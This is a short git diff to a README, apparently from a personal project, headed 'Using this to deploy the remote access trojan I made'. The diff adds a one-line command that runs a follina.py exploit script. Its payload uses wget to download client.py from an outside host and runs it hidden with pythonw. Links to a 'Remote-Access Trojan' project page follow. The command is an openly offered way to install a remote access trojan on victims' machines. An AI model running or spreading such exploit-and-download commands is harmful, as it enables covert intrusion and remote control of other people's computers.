@@ -1,4 +1,6 @@
 ## Using this to deploy the remote access trojan I made
+> python3 follina.py -c "wget -o 'client.py' https://.source-code-server./Client.py | pythonw client.py"
+
 
 ### [Remote-Access Trojan](https://lissankoirala.ml/projects/remote-access)
 <img src="https://github.com/LissanKoirala/LissanKoirala/blob/main/trojan-globe.gif" alt="drawing" with="100"/>
